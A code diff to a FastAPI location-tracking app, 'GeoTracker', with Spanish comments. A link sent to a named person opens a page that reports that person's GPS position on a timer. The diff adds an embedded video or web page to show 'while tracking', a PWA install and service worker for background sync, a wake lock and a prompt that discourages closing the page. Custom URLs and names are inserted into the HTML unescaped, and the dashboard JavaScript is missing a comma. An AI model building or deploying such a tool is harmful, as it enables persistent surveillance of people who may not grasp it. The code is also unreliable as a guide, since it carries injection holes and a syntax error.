@@ -37,14 +37,20 @@ class DeviceRegister(BaseModel):
     name: str = Field(..., description="Nombre del propietario")
     update_interval: int = Field(600, description="Intervalo de actualización en segundos (default: 10 min)")
     auto_tracking: bool = Field(True, description="Activar rastreo automático")
+    custom_url: Optional[str] = Field(None, description="URL personalizada para mostrar (YouTube, web, etc)")
     
     @validator('phone')
     def validate_phone(cls, v):
-        # Remover espacios y caracteres especiales
         phone = ''.join(filter(str.isdigit, v))
         if len(phone) < 10:
             raise ValueError('Número telefónico inválido')
         return f"+{phone}" if not v.startswith('+') else v
+    
+    @validator('custom_url')
+    def validate_url(cls, v):
+        if v and not v.startswith(('http://', 'https://')):
+            raise ValueError('URL debe empezar con http:// o https://')
+        return v
 
 class LocationUpdate(BaseModel):
     """Actualización de ubicación"""
@@ -89,6 +95,18 @@ security = HTTPBasic()
 # ═══════════════════════════════════════════════════════════════════
 # BASE DE DATOS MEJORADA
 # ═══════════════════════════════════════════════════════════════════
+def upgrade_db_for_custom_urls():
+    """Agregar columna custom_url a la tabla devices"""
+    conn = sqlite3.connect(DATABASE)
+    c = conn.cursor()
+    try:
+        c.execute('ALTER TABLE devices ADD COLUMN custom_url TEXT')
+        conn.commit()
+        print("✅ Base de datos actualizada con custom_url")
+    except sqlite3.OperationalError:
+        print("ℹ️ Columna custom_url ya existe")
+    finally:
+        conn.close()
 
 def init_db():
     conn = sqlite3.connect(DATABASE)
@@ -340,6 +358,7 @@ async def check_geofencing(device_id: int, lat: float, lon: float):
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     init_db()
+    upgrade_db_for_custom_urls()
     # Iniciar tarea de actualización periódica
     asyncio.create_task(periodic_location_updater())
     yield
@@ -387,20 +406,18 @@ async def register_device(
     conn = sqlite3.connect(DATABASE)
     c = conn.cursor()
     
-    # Obtener user_id
     c.execute('SELECT id FROM users WHERE username = ?', (username,))
     user_id = c.fetchone()[0]
     
     try:
         c.execute('''
-            INSERT INTO devices (phone, name, user_id, update_interval, auto_tracking, created_at)
-            VALUES (?, ?, ?, ?, ?, ?)
+            INSERT INTO devices (phone, name, user_id, update_interval, auto_tracking, custom_url, created_at)
+            VALUES (?, ?, ?, ?, ?, ?, ?)
         ''', (device.phone, device.name, user_id, device.update_interval, 
-              device.auto_tracking, datetime.now().isoformat()))
+              device.auto_tracking, device.custom_url, datetime.now().isoformat()))
         
         device_id = c.lastrowid
         
-        # Generar token de acceso
         token = secrets.token_urlsafe(32)
         expires_at = (datetime.now() + timedelta(days=365)).isoformat()
         
@@ -420,6 +437,7 @@ async def register_device(
             "name": device.name,
             "token": token,
             "tracking_url": tracking_url,
+            "custom_url": device.custom_url,
             "update_interval": device.update_interval,
             "instructions": f"Envía este link a {device.name} para activar rastreo automático"
         }
@@ -428,6 +446,7 @@ async def register_device(
         raise HTTPException(400, f"El teléfono {device.phone} ya está registrado")
     finally:
         conn.close()
+
 
 @app.get("/api/devices/list")
 async def list_devices(username: str = Depends(get_current_user)):
@@ -807,15 +826,141 @@ async def periodic_location_updater():
 # PÁGINA DE RASTREO PARA DISPOSITIVO
 # ═══════════════════════════════════════════════════════════════════
 
-@app.get("/track/{token}", response_class=HTMLResponse)
-async def tracking_page(token: str):
-    """Página que activa el rastreo automático en el dispositivo"""
+@app.get("/manifest/{token}")
+async def get_manifest(token: str):
+    """Generar manifest.json para PWA"""
     conn = sqlite3.connect(DATABASE)
     c = conn.cursor()
     
-    # Verificar token
     c.execute('''
-        SELECT d.id, d.phone, d.name, d.update_interval
+        SELECT d.name FROM device_tokens dt
+        JOIN devices d ON dt.device_id = d.id
+        WHERE dt.token = ?
+    ''', (token,))
+    
+    device = c.fetchone()
+    conn.close()
+    
+    if not device:
+        raise HTTPException(404, "Token inválido")
+    
+    name = device[0]
+    
+    return JSONResponse({
+        "name": f"GeoTracker - {name}",
+        "short_name": "GeoTracker",
+        "description": "Sistema de rastreo GPS en tiempo real",
+        "start_url": f"/track/{token}",
+        "display": "standalone",
+        "background_color": "#667eea",
+        "theme_color": "#667eea",
+        "orientation": "portrait",
+        "icons": [
+            {
+                "src": "/static/icon-192.png",
+                "sizes": "192x192",
+                "type": "image/png",
+                "purpose": "any maskable"
+            },
+            {
+                "src": "/static/icon-512.png",
+                "sizes": "512x512",
+                "type": "image/png"
+            }
+        ]
+    })
+
+@app.get("/service-worker.js", response_class=HTMLResponse)
+async def service_worker():
+    """Service Worker para funcionalidad offline y background sync"""
+    return HTMLResponse(content="""
+// Service Worker para GeoTracker
+const CACHE_NAME = 'geotracker-v1';
+const urlsToCache = ['/'];
+
+// Instalación
+self.addEventListener('install', event => {
+    event.waitUntil(
+        caches.open(CACHE_NAME)
+            .then(cache => cache.addAll(urlsToCache))
+    );
+    self.skipWaiting();
+});
+
+// Activación
+self.addEventListener('activate', event => {
+    event.waitUntil(
+        caches.keys().then(cacheNames => {
+            return Promise.all(
+                cacheNames.map(cacheName => {
+                    if (cacheName !== CACHE_NAME) {
+                        return caches.delete(cacheName);
+                    }
+                })
+            );
+        })
+    );
+    self.clients.claim();
+});
+
+// Background Sync
+self.addEventListener('sync', event => {
+    if (event.tag === 'location-sync') {
+        event.waitUntil(syncLocation());
+    }
+});
+
+async function syncLocation() {
+    try {
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        });
+        
+        // Aquí iría la lógica de envío al servidor
+        console.log('📍 Ubicación sincronizada en background:', position);
+        
+        // Mostrar notificación
+        self.registration.showNotification('GeoTracker', {
+            body: '📍 Ubicación actualizada en segundo plano',
+            icon: '/static/icon-192.png',
+            badge: '/static/badge-72.png',
+            tag: 'location-sync'
+        });
+        
+    } catch (error) {
+        console.error('Error en sync:', error);
+    }
+}
+
+// Periodic Sync (experimental - solo Chrome Android)
+self.addEventListener('periodicsync', event => {
+    if (event.tag === 'location-sync') {
+        event.waitUntil(syncLocation());
+    }
+});
+
+// Fetch
+self.addEventListener('fetch', event => {
+    event.respondWith(
+        fetch(event.request).catch(() => {
+            return caches.match(event.request);
+        })
+    );
+});
+    """, media_type="application/javascript")
+
+@app.get("/track/{token}", response_class=HTMLResponse)
+async def tracking_page(token: str):
+    """Página que activa el rastreo automático con Service Worker"""
+    conn = sqlite3.connect(DATABASE)
+    c = conn.cursor()
+    
+    c.execute('''
+        SELECT d.id, d.phone, d.name, d.update_interval, d.custom_url
         FROM device_tokens dt
         JOIN devices d ON dt.device_id = d.id
         WHERE dt.token = ? AND dt.expires_at > ?
@@ -827,7 +972,21 @@ async def tracking_page(token: str):
     if not device:
         raise HTTPException(404, "Token inválido o expirado")
     
-    device_id, phone, name, update_interval = device
+    device_id, phone, name, update_interval, custom_url = device
+    
+    # Si hay URL personalizada, mostrar iframe
+    content_html = ""
+    if custom_url:
+        content_html = f"""
+        <div style="margin-top: 20px; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.2);">
+            <iframe 
+                src="{custom_url}" 
+                style="width: 100%; height: 500px; border: none;"
+                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                allowfullscreen>
+            </iframe>
+        </div>
+        """
     
     return HTMLResponse(content=f"""
     <!DOCTYPE html>
@@ -836,61 +995,50 @@ async def tracking_page(token: str):
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>GeoTracker - {name}</title>
+        <link rel="manifest" href="/manifest/{token}">
+        <meta name="theme-color" content="#667eea">
+        <meta name="apple-mobile-web-app-capable" content="yes">
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
         <style>
             * {{ margin: 0; padding: 0; box-sizing: border-box; }}
             body {{
                 font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
                 background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                 min-height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
                 padding: 20px;
             }}
             .container {{
                 background: white;
                 border-radius: 20px;
-                padding: 40px;
-                max-width: 500px;
-                width: 100%;
+                padding: 30px;
+                max-width: 600px;
+                margin: 0 auto;
                 box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            }}
+            h1 {{ color: #667eea; margin-bottom: 10px; text-align: center; }}
+            .status {{
+                padding: 15px;
+                margin: 15px 0;
+                border-radius: 10px;
+                font-size: 14px;
+                font-weight: 600;
                 text-align: center;
             }}
-            h1 {{ color: #667eea; margin-bottom: 10px; }}
-            .status {{
-                padding: 20px;
-                margin: 20px 0;
-                border-radius: 10px;
-                font-size: 16px;
-                font-weight: 600;
-            }}
-            .status.active {{
-                background: #d4edda;
-                color: #155724;
-                border: 2px solid #28a745;
-            }}
-            .status.waiting {{
-                background: #fff3cd;
-                color: #856404;
-                border: 2px solid #ffc107;
-            }}
-            .status.error {{
-                background: #f8d7da;
-                color: #721c24;
-                border: 2px solid #dc3545;
-            }}
+            .status.active {{ background: #d4edda; color: #155724; border: 2px solid #28a745; }}
+            .status.waiting {{ background: #fff3cd; color: #856404; border: 2px solid #ffc107; }}
+            .status.error {{ background: #f8d7da; color: #721c24; border: 2px solid #dc3545; }}
             .info {{
                 background: #f8f9fa;
-                padding: 20px;
+                padding: 15px;
                 border-radius: 10px;
-                margin: 20px 0;
-                text-align: left;
+                margin: 15px 0;
             }}
             .info-item {{
                 display: flex;
                 justify-content: space-between;
-                padding: 10px 0;
+                padding: 8px 0;
                 border-bottom: 1px solid #dee2e6;
+                font-size: 14px;
             }}
             .info-item:last-child {{ border-bottom: none; }}
             .label {{ color: #666; }}
@@ -899,58 +1047,74 @@ async def tracking_page(token: str):
                 background: #667eea;
                 color: white;
                 border: none;
-                padding: 15px 30px;
-                border-radius: 10px;
-                font-size: 16px;
+                padding: 12px 20px;
+                border-radius: 8px;
+                font-size: 14px;
                 font-weight: 600;
                 cursor: pointer;
                 width: 100%;
-                margin-top: 20px;
+                margin-top: 10px;
                 transition: all 0.3s;
             }}
-            .btn:hover {{
-                background: #5568d3;
-                transform: translateY(-2px);
-            }}
-            .btn:disabled {{
-                background: #ccc;
-                cursor: not-allowed;
-                transform: none;
-            }}
+            .btn:hover {{ background: #5568d3; transform: translateY(-2px); }}
+            .btn:disabled {{ background: #ccc; cursor: not-allowed; transform: none; }}
             .spinner {{
                 border: 3px solid rgba(102, 126, 234, 0.3);
                 border-top: 3px solid #667eea;
                 border-radius: 50%;
-                width: 40px;
-                height: 40px;
+                width: 30px;
+                height: 30px;
                 animation: spin 1s linear infinite;
-                margin: 20px auto;
+                margin: 10px auto;
             }}
             @keyframes spin {{
                 0% {{ transform: rotate(0deg); }}
                 100% {{ transform: rotate(360deg); }}
             }}
             .updates-list {{
-                max-height: 200px;
+                max-height: 150px;
                 overflow-y: auto;
                 background: #f8f9fa;
-                border-radius: 10px;
+                border-radius: 8px;
                 padding: 10px;
-                margin-top: 20px;
+                margin-top: 15px;
+                font-size: 13px;
             }}
             .update-item {{
-                padding: 10px;
+                padding: 8px;
                 background: white;
-                margin-bottom: 10px;
+                margin-bottom: 8px;
                 border-radius: 5px;
-                font-size: 14px;
+                border-left: 3px solid #667eea;
             }}
+            .install-prompt {{
+                background: linear-gradient(135deg, #667eea, #764ba2);
+                color: white;
+                padding: 15px;
+                border-radius: 10px;
+                margin: 15px 0;
+                text-align: center;
+                display: none;
+            }}
+            .install-prompt.show {{ display: block; }}
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>📍 GeoTracker Activo</h1>
-            <p style="color: #666; margin-bottom: 20px;">Hola {name}</p>
+            <h1>📍 Rastreo Activo</h1>
+            <p style="text-align: center; color: #666; margin-bottom: 15px;">Hola {name}</p>
+            
+            <!-- Prompt para instalar PWA -->
+            <div class="install-prompt" id="install-prompt">
+                <div style="font-size: 2em; margin-bottom: 10px;">📱</div>
+                <strong>¡Instala la App!</strong>
+                <p style="font-size: 0.9em; margin: 10px 0;">
+                    Para rastreo continuo en segundo plano, instala esta aplicación en tu dispositivo
+                </p>
+                <button class="btn" style="background: white; color: #667eea;" onclick="installPWA()">
+                    📥 Instalar Aplicación
+                </button>
+            </div>
             
             <div class="status waiting" id="status">
                 <div class="spinner"></div>
@@ -964,7 +1128,7 @@ async def tracking_page(token: str):
                 </div>
                 <div class="info-item">
                     <span class="label">⏱️ Intervalo:</span>
-                    <span class="value" id="interval">{update_interval // 60} minutos</span>
+                    <span class="value">{update_interval // 60} minutos</span>
                 </div>
                 <div class="info-item">
                     <span class="label">🔋 Batería:</span>
@@ -978,59 +1142,146 @@ async def tracking_page(token: str):
                     <span class="label">📊 Total enviadas:</span>
                     <span class="value" id="total-updates">0</span>
                 </div>
+                <div class="info-item">
+                    <span class="label">⚙️ Service Worker:</span>
+                    <span class="value" id="sw-status">Desactivado</span>
+                </div>
             </div>
             
             <button class="btn" id="manual-btn" onclick="sendLocationNow()">
                 📍 Enviar Ubicación Ahora
             </button>
             
+            <button class="btn" style="background: #28a745;" onclick="requestNotificationPermission()">
+                🔔 Activar Notificaciones
+            </button>
+            
             <div class="updates-list" id="updates-list" style="display: none;">
                 <strong>Últimas actualizaciones:</strong>
                 <div id="updates-content"></div>
             </div>
+            
+            {content_html}
         </div>
         
         <script>
             const PHONE = "{phone}";
-            const UPDATE_INTERVAL = {update_interval} * 1000; // Convertir a ms
+            const UPDATE_INTERVAL = {update_interval} * 1000;
+            const TOKEN = "{token}";
             let updateCount = 0;
             let trackingInterval = null;
             let batteryLevel = null;
+            let deferredPrompt = null;
             
-            // Actualizar estado visual
+            // ========== SERVICE WORKER ==========
+            async function registerServiceWorker() {{
+                if (!('serviceWorker' in navigator)) {{
+                    console.warn('Service Worker no soportado');
+                    return;
+                }}
+                
+                try {{
+                    const registration = await navigator.serviceWorker.register('/service-worker.js');
+                    console.log('✅ Service Worker registrado:', registration);
+                    document.getElementById('sw-status').textContent = '✅ Activo';
+                    document.getElementById('sw-status').style.color = '#28a745';
+                    
+                    // Configurar sincronización periódica (experimental)
+                    if ('periodicSync' in registration) {{
+                        try {{
+                            await registration.periodicSync.register('location-sync', {{
+                                minInterval: UPDATE_INTERVAL
+                            }});
+                            console.log('✅ Sincronización periódica configurada');
+                            addUpdate('✅ Sincronización en segundo plano activada');
+                        }} catch (err) {{
+                            console.log('Periodic Sync no disponible:', err);
+                        }}
+                    }}
+                    
+                    return registration;
+                }} catch (error) {{
+                    console.error('Error al registrar Service Worker:', error);
+                    document.getElementById('sw-status').textContent = '❌ Error';
+                }}
+            }}
+            
+            // ========== INSTALACIÓN PWA ==========
+            window.addEventListener('beforeinstallprompt', (e) => {{
+                e.preventDefault();
+                deferredPrompt = e;
+                document.getElementById('install-prompt').classList.add('show');
+            }});
+            
+            async function installPWA() {{
+                if (!deferredPrompt) {{
+                    alert('La instalación no está disponible en este navegador');
+                    return;
+                }}
+                
+                deferredPrompt.prompt();
+                const {{ outcome }} = await deferredPrompt.userChoice;
+                
+                if (outcome === 'accepted') {{
+                    console.log('✅ PWA instalada');
+                    document.getElementById('install-prompt').classList.remove('show');
+                    addUpdate('✅ Aplicación instalada correctamente');
+                }} else {{
+                    console.log('❌ Instalación cancelada');
+                }}
+                
+                deferredPrompt = null;
+            }}
+            
+            // ========== NOTIFICACIONES ==========
+            async function requestNotificationPermission() {{
+                if (!('Notification' in window)) {{
+                    alert('Notificaciones no soportadas en este navegador');
+                    return;
+                }}
+                
+                const permission = await Notification.requestPermission();
+                
+                if (permission === 'granted') {{
+                    new Notification('🎯 GeoTracker Activo', {{
+                        body: 'Rastreo en segundo plano activado',
+                        icon: '/static/icon-192.png',
+                        badge: '/static/badge-72.png'
+                    }});
+                    addUpdate('✅ Notificaciones activadas');
+                }} else {{
+                    alert('❌ Permisos de notificación denegados');
+                }}
+            }}
+            
+            // ========== FUNCIONES DE UBICACIÓN ==========
             function setStatus(message, type = 'waiting') {{
                 const statusEl = document.getElementById('status');
                 statusEl.className = `status ${{type}}`;
                 statusEl.innerHTML = message;
             }}
             
-            // Agregar actualización a la lista
             function addUpdate(message) {{
                 const list = document.getElementById('updates-list');
                 const content = document.getElementById('updates-content');
-                
                 list.style.display = 'block';
                 
                 const item = document.createElement('div');
                 item.className = 'update-item';
                 item.textContent = `${{new Date().toLocaleTimeString()}} - ${{message}}`;
-                
                 content.insertBefore(item, content.firstChild);
                 
-                // Mantener solo últimas 5
                 while (content.children.length > 5) {{
                     content.removeChild(content.lastChild);
                 }}
             }}
             
-            // Obtener información de batería
             async function getBattery() {{
                 try {{
                     const battery = await navigator.getBattery();
                     batteryLevel = Math.round(battery.level * 100);
                     document.getElementById('battery').textContent = `${{batteryLevel}}%`;
                     
-                    // Actualizar cuando cambie
                     battery.addEventListener('levelchange', () => {{
                         batteryLevel = Math.round(battery.level * 100);
                         document.getElementById('battery').textContent = `${{batteryLevel}}%`;
@@ -1040,7 +1291,6 @@ async def tracking_page(token: str):
                 }}
             }}
             
-            // Enviar ubicación al servidor
             async function sendLocation(latitude, longitude, accuracy) {{
                 try {{
                     const response = await fetch('/api/locations/update', {{
@@ -1060,24 +1310,32 @@ async def tracking_page(token: str):
                     if (data.success) {{
                         updateCount++;
                         document.getElementById('total-updates').textContent = updateCount;
-                        document.getElementById('last-update').textContent = 
-                            new Date().toLocaleTimeString();
+                        document.getElementById('last-update').textContent = new Date().toLocaleTimeString();
                         
                         const address = data.address || 'Ubicación capturada';
-                        setStatus(`✅ Ubicación enviada correctamente<br><small>${{address}}</small>`, 'active');
-                        addUpdate(`Enviado: ${{latitude.toFixed(6)}}, ${{longitude.toFixed(6)}} (±${{Math.round(accuracy)}}m)`);
+                        setStatus(`✅ Ubicación enviada<br><small>${{address}}</small>`, 'active');
+                        addUpdate(`✅ Enviado: ${{latitude.toFixed(6)}}, ${{longitude.toFixed(6)}}`);
+                        
+                        // Enviar notificación si está permitido
+                        if (Notification.permission === 'granted') {{
+                            new Notification('📍 Ubicación Actualizada', {{
+                                body: `${{address}}`,
+                                icon: '/static/icon-192.png',
+                                tag: 'location-update',
+                                requireInteraction: false
+                            }});
+                        }}
                         
                         return true;
                     }}
                 }} catch (error) {{
                     console.error('Error al enviar ubicación:', error);
                     setStatus('❌ Error al enviar ubicación', 'error');
-                    addUpdate('Error de conexión');
+                    addUpdate('❌ Error de conexión');
                     return false;
                 }}
             }}
             
-            // Capturar ubicación GPS
             async function captureLocation() {{
                 return new Promise((resolve) => {{
                     if (!navigator.geolocation) {{
@@ -1097,7 +1355,7 @@ async def tracking_page(token: str):
                         (error) => {{
                             console.error('Error GPS:', error);
                             setStatus(`❌ Error GPS: ${{error.message}}`, 'error');
-                            addUpdate(`Error: ${{error.message}}`);
+                            addUpdate(`❌ Error: ${{error.message}}`);
                             resolve(false);
                         }},
                         {{
@@ -1109,81 +1367,93 @@ async def tracking_page(token: str):
                 }});
             }}
             
-            // Enviar ubicación manualmente
             async function sendLocationNow() {{
                 const btn = document.getElementById('manual-btn');
                 btn.disabled = true;
                 btn.textContent = '📍 Enviando...';
-                
                 await captureLocation();
-                
                 btn.disabled = false;
                 btn.textContent = '📍 Enviar Ubicación Ahora';
             }}
             
-            // Iniciar rastreo automático
             async function startTracking() {{
                 setStatus('🚀 Iniciando rastreo automático...', 'waiting');
                 
-                // Primera captura inmediata
                 const success = await captureLocation();
                 
                 if (success) {{
-                    // Configurar intervalo
                     trackingInterval = setInterval(async () => {{
                         await captureLocation();
                     }}, UPDATE_INTERVAL);
                     
                     const minutes = Math.round(UPDATE_INTERVAL / 60000);
-                    addUpdate(`Rastreo automático activado (cada ${{minutes}} min)`);
+                    addUpdate(`🚀 Rastreo automático activado (cada ${{minutes}} min)`);
                 }}
             }}
             
-            // Mantener la página activa (prevenir suspensión)
+            // ========== MANTENER ACTIVO ==========
             function keepAlive() {{
+                // Wake Lock API
                 if ('wakeLock' in navigator) {{
                     navigator.wakeLock.request('screen')
                         .then(wakeLock => {{
-                            console.log('Wake Lock activado');
-                            addUpdate('Modo activo: pantalla no se suspenderá');
+                            console.log('✅ Wake Lock activado');
+                            addUpdate('✅ Pantalla permanecerá activa');
                         }})
                         .catch(err => {{
                             console.log('Wake Lock no disponible:', err);
                         }});
                 }}
+                
+                // Background Sync
+                if ('serviceWorker' in navigator && 'sync' in ServiceWorkerRegistration.prototype) {{
+                    navigator.serviceWorker.ready.then(registration => {{
+                        return registration.sync.register('location-sync');
+                    }}).then(() => {{
+                        console.log('✅ Background Sync registrado');
+                    }}).catch(err => {{
+                        console.log('Background Sync no disponible:', err);
+                    }});
+                }}
             }}
             
-            // Inicializar
+            // ========== INICIALIZACIÓN ==========
             window.addEventListener('load', async () => {{
+                await registerServiceWorker();
                 await getBattery();
                 await startTracking();
                 keepAlive();
                 
-                // Solicitar permisos de notificación
-                if ('Notification' in window && Notification.permission === 'default') {{
-                    Notification.requestPermission();
+                if (Notification.permission === 'default') {{
+                    setTimeout(() => {{
+                        requestNotificationPermission();
+                    }}, 3000);
                 }}
             }});
             
-            // Manejar visibilidad de la página
+            // Manejar visibilidad
             document.addEventListener('visibilitychange', () => {{
                 if (document.hidden) {{
-                    console.log('Página oculta, manteniendo rastreo');
+                    console.log('📱 Página oculta - rastreo en segundo plano activo');
+                    addUpdate('📱 App en segundo plano');
                 }} else {{
-                    console.log('Página visible, rastreo activo');
+                    console.log('👁️ Página visible - rastreo activo');
+                    addUpdate('👁️ App visible');
                 }}
             }});
             
-            // Prevenir cierre accidental
+            // Prevenir cierre
             window.addEventListener('beforeunload', (e) => {{
                 e.preventDefault();
-                e.returnValue = '';
-                return 'El rastreo GPS está activo. ¿Estás seguro de cerrar?';
+                e.returnValue = 'El rastreo GPS está activo. ¿Cerrar?';
+                return e.returnValue;
             }});
         </script>
     </body>
     </html>
     """)
+
+
 
 # ═══════════════════════════════════════════════════════════════════
 # DASHBOARD MEJORADO CON MAPA INTERACTIVO
@@ -1699,6 +1969,11 @@ async def dashboard(username: str = Depends(get_current_user)):
                         <input type="checkbox" name="auto_tracking" id="auto_tracking" checked>
                         <label for="auto_tracking">🔄 Activar rastreo automático</label>
                     </div>
+                        <div class="form-group">
+                        <label>🔗 URL Personalizada (Opcional)</label>
+                        <input type="url" name="custom_url" placeholder="https://www.youtube.com/watch?v=...">
+                        <small>Puedes mostrar un video de YouTube o cualquier página web mientras se rastrea</small>
+                    </div>
                     <button type="submit" class="btn btn-primary">✅ Registrar Dispositivo</button>
                 </form>
             </div>
@@ -2009,6 +2284,7 @@ async def dashboard(username: str = Depends(get_current_user)):
                     name: formData.get('name'),
                     update_interval: parseInt(formData.get('update_interval')) * 60, // Convertir a segundos
                     auto_tracking: formData.get('auto_tracking') === 'on'
+                    custom_url: formData.get('custom_url') || null 
                 };
                 
                 try {
